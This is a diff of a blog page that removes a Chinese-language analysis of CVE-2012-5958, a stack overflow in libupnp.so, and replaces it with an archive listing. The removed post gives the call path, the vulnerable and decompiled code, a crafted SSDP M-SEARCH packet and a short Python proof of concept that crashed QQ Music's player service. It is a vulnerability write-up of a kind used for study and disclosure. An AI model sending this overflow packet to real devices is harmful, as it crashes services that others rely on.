@@ -7,17 +7,13 @@
 
     
 
-    <title>libupnp.so 系列漏洞分析 | </title><meta name="robots" content="noindex">
+    <title>Archives: 2020/9 | </title>
     <meta name="author" content="ssj">
-    
-    <meta name="description" content="CVE-2012-5958 – Stack Overflow调用路径
-int main(int argc, char *argv[])
-int TvDeviceStart(char *ip_address, unsigned short port, const char *desc_doc_name">
     
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    <meta property="og:title" content="libupnp.so 系列漏洞分析">
+    
     <meta property="og:site_name" content="ssj&#39;s blog">
 
     
@@ -387,91 +383,40 @@ int TvDeviceStart(char *ip_address, unsigned short port, const char *desc_doc_na
 
     <main>
         <div class="container main-container">
-    <nav class="page-nav hide-on-small-only">
+    
+
+<nav class="page-nav hide-on-small-only">
     <div class="nav-wrapper pink">
-        <span class="breadcrumb">Current page(Categories)</span>
-        
-            
-    
-    
-    <a class="breadcrumb" href="/categories/Android/">Android</a>
-
-
+        <span class="breadcrumb">Current page(Archives)</span>
         
 
         
     </div>
 </nav>
 
-<article>
-    <div class="card">
-        <div class="card-content">
-            
-
-            <div class="article-title">
-                
-    
-        <h1>libupnp.so 系列漏洞分析</h1>
-    
 
 
-            </div>
-            <time class="pink-link-context" datetime="2020-06-30T15:20:52.000Z"><a href="/2020/06/30/libupnp-so-系列漏洞分析/">2020-06-30</a></time>
-
-            <span id="busuanzi_container_page_pv" class="read-times-container">
-    <i class="fa fa-eye"></i>
-    <span id="busuanzi_value_page_pv"></span>
-</span>
-
-            
-    <div class="tags-row">
+    <ul class="collapsible mt-0" data-collapsible="accordion">
         
-            <a href="/tags/Android/" class="chip pink lighten-1">Android</a>
         
-    </div>
-
-
-            <div class="toc pink-link-context hide-on-med-and-down">
-    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#CVE-2012-5958-–-Stack-Overflow"><span class="section table-of-contents-text">CVE-2012-5958 – Stack Overflow</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#调用路径"><span class="section table-of-contents-text">调用路径</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#源码"><span class="section table-of-contents-text">源码</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#反编译"><span class="section table-of-contents-text">反编译</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#构造包"><span class="section table-of-contents-text">构造包</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#python-poc"><span class="section table-of-contents-text">python poc</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#效果"><span class="section table-of-contents-text">效果</span></a></li></ol></li></ol>
-</div>
-
-
-            <div class="entry pink-link-context">
-                <h2 id="CVE-2012-5958-–-Stack-Overflow"><a href="#CVE-2012-5958-–-Stack-Overflow" class="headerlink" title="CVE-2012-5958 – Stack Overflow"></a>CVE-2012-5958 – Stack Overflow</h2><h3 id="调用路径"><a href="#调用路径" class="headerlink" title="调用路径"></a>调用路径</h3><ul>
-<li><code>int main(int argc, char *argv[])</code></li>
-<li><code>int TvDeviceStart(char *ip_address, unsigned short port, const char *desc_doc_name, const char *web_dir_path, print_string pfun, int combo)</code>or<code>int TvCtrlPointStart(print_string printFunctionPtr, state_update updateFunctionPtr, int combo)</code>-&gt;</li>
-<li><code>int UpnpInit(const char *HostIP, unsigned short DestPort)</code>-&gt;</li>
-<li><code>static int UpnpInitStartServers(unsigned short DestPort)</code>-&gt;</li>
-<li><code>int StartMiniServer(uint16_t *listen_port4, uint16_t *listen_port6)</code>-&gt;</li>
-<li><code>static void RunMiniServer(MiniServerSockArray *miniSock)</code>-&gt;</li>
-<li><code>static void ssdp_read(SOCKET rsock, fd_set *set)</code>-&gt;</li>
-<li><code>void readFromSSDPSocket(SOCKET socket)</code>-&gt;</li>
-<li><code>static void ssdp_event_handler_thread(void *the_data)</code>-&gt;</li>
-<li><code>void ssdp_handle_ctrlpt_msg(http_message_t *hmsg, struct sockaddr_storage *dest_addr, int timeout, void *cookie)</code>or<code>ssdp_handle_device_request(hmsg, &amp;data-&gt;dest_addr);</code>-&gt;</li>
-<li><code>int ssdp_request_type(char *cmd, SsdpEvent *Evt)</code>-&gt;</li>
-<li><code>int unique_service_name(char *cmd, SsdpEvent *Evt)</code>-&gt;</li>
-<li><code>strncpy(TempBuf, ptr1, n); // cve-2012-5958</code>.</li>
-</ul>
-<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">unique_service_name</span><span class="params">(<span class="keyword">char</span> *cmd, SsdpEvent *Evt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> TempBuf[COMMAND_LEN];</span><br><span class="line">    <span class="keyword">char</span> *TempPtr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *Ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *ptr1 = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *ptr2 = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> *ptr3 = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> CommandFound = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> n = (<span class="keyword">size_t</span>)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cmd, <span class="string">"uuid:schemas"</span>) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ptr1 = <span class="built_in">strstr</span>(cmd, <span class="string">":device"</span>);</span><br><span class="line">        <span class="keyword">if</span> (ptr1 != <span class="literal">NULL</span>)</span><br><span class="line">            ptr2 = <span class="built_in">strstr</span>(ptr1 + <span class="number">1</span>, <span class="string">":"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">// ptr1 = :device:aaaaa:anything</span></span><br><span class="line">        <span class="comment">// ptr2 = :aaaaa:anything</span></span><br><span class="line">        <span class="comment">// ptr3 = :anything</span></span><br><span class="line">        <span class="keyword">if</span> (ptr2 != <span class="literal">NULL</span>)</span><br><span class="line">            ptr3 = <span class="built_in">strstr</span>(ptr2 + <span class="number">1</span>, <span class="string">":"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="comment">// 5 + 9 + 1 &lt; 180</span></span><br><span class="line">        <span class="keyword">if</span> (ptr3 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strlen</span>(<span class="string">"uuid:"</span>) + <span class="built_in">strlen</span>(ptr3 + <span class="number">1</span>) &gt;= <span class="keyword">sizeof</span>(Evt-&gt;UDN))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            <span class="built_in">snprintf</span>(Evt-&gt;UDN, <span class="keyword">sizeof</span>(Evt-&gt;UDN), <span class="string">"uuid:%s"</span>,</span><br><span class="line">                ptr3 + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        ptr1 = <span class="built_in">strstr</span>(cmd, <span class="string">":"</span>);</span><br><span class="line">        <span class="keyword">if</span> (ptr1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            n = (<span class="keyword">size_t</span>)ptr3 - (<span class="keyword">size_t</span>)ptr1;</span><br><span class="line">            <span class="built_in">strncpy</span>(TempBuf, ptr1, n); <span class="comment">// cve-2012-5958</span></span><br><span class="line">            TempBuf[n] = <span class="string">'\0'</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strlen</span>(<span class="string">"urn"</span>) + <span class="built_in">strlen</span>(TempBuf) &gt;= <span class="keyword">sizeof</span>(Evt-&gt;DeviceType))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            <span class="built_in">snprintf</span>(Evt-&gt;DeviceType, <span class="keyword">sizeof</span>(Evt-&gt;DeviceType),</span><br><span class="line">                <span class="string">"urn%s"</span>, TempBuf);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">unique_service_name</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">size_t</span> v11; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v13; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">char</span> *v14; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">char</span> *v17; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">char</span> *v18; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+4h] [bp-14Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [sp+130h] [bp-20h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a2;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  v4 = <span class="built_in">strstr</span>(a1, <span class="string">"uuid:schemas"</span>);</span><br><span class="line">  v5 = (<span class="keyword">char</span>)v4;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="built_in">strstr</span>(v3, <span class="string">":device"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">    v7 = <span class="built_in">strchr</span>(v6 + <span class="number">1</span>, <span class="number">58</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_32;</span><br><span class="line">    v8 = <span class="built_in">strchr</span>(v7 + <span class="number">1</span>, <span class="number">58</span>);</span><br><span class="line">    v9 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( v8</span><br><span class="line">      &amp;&amp; <span class="built_in">strlen</span>(v8 + <span class="number">1</span>) + <span class="number">5</span> &lt;= <span class="number">0xB3</span></span><br><span class="line">      &amp;&amp; (<span class="built_in">snprintf</span>(v2 + <span class="number">16</span>, <span class="number">0xB4</span>u, <span class="string">"uuid:%s"</span>, v9 + <span class="number">1</span>), (v10 = <span class="built_in">strchr</span>(v3, <span class="number">58</span>)) != <span class="number">0</span>)</span><br><span class="line">      &amp;&amp; (v11 = v9 - v10, <span class="built_in">strncpy</span>(&amp;dest, v10, v11), *(&amp;v21 + v11 - <span class="number">300</span>) = <span class="number">0</span>, <span class="built_in">strlen</span>(&amp;dest) + <span class="number">3</span> &lt;= <span class="number">0xB3</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>(v2 + <span class="number">196</span>, <span class="number">0xB4</span>u, <span class="string">"urn%s"</span>, &amp;dest);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_32:</span><br><span class="line">      result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
-<h3 id="构造包"><a href="#构造包" class="headerlink" title="构造包"></a>构造包</h3><p>M-SEARCH * HTTP/1.1<br>Host:239.255.255.250:1900<br>ST:uuid:schemas:device:AAAA[…]AAAA:anything<br>Man:”ssdp:discover”<br>MX:3</p>
-<h3 id="python-poc"><a href="#python-poc" class="headerlink" title="python poc"></a>python poc</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">SSDP_ADDR = <span class="string">'192.168.43.7'</span></span><br><span class="line">SSDP_PORT = <span class="number">1900</span></span><br><span class="line"></span><br><span class="line">MS = <span class="string">'''M-SEARCH * HTTP/1.1</span></span><br><span class="line"><span class="string">Host:239.255.255.250:1900</span></span><br><span class="line"><span class="string">ST:uuid:schemas:device:&#123;&#125;:anything</span></span><br><span class="line"><span class="string">Man:"ssdp:discover"</span></span><br><span class="line"><span class="string">MX:3</span></span><br><span class="line"><span class="string">'''</span>.format(<span class="string">'A'</span> * <span class="number">600</span>)</span><br><span class="line"></span><br><span class="line">__s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">__s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">local_ip = socket.gethostbyname(socket.gethostname())</span><br><span class="line">__s.bind((local_ip, <span class="number">50000</span>))</span><br><span class="line">__s.sendto(MS, (SSDP_ADDR, SSDP_PORT))</span><br></pre></td></tr></table></figure>
-<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="效果.png" alt="效果" title="效果"></p>
-<p><code>com.tencent.qqmusic:QQPlayerService</code>就是加载<code>libupnp.so</code>的进程，可以看到<code>com.tencent.qqmusic:QQPlayerService</code>崩了然后又重启。</p>
-<!-- flag of hidden posts -->
-                
-
-
-
-            </div>
-			
-        </div>
-    </div>
-</article>
-
-
-
-
+            <li>
+                <div class="collapsible-header active">
+                    <i class="fa fa-archive"></i>2020
+                </div>
+                <div class="collapsible-body">
+                    <div class="collection">
+                        
+                            <a href="/2020/09/01/Android-libpl-droidsonroids-gif-so-Double-Free分析/" class="collection-item grey-text text-darken-1">
+                                <time datetime="2020-09-01T12:36:31.000Z">2020-09-01</time>
+                                <span>&nbsp;&nbsp;&nbsp;</span>
+                                Android libpl_droidsonroids_gif.so Double Free分析
+                            </a>
+                        
+                    </div>
+                </div>
+            </li>
+        
+    </ul>
 
 
 </div>
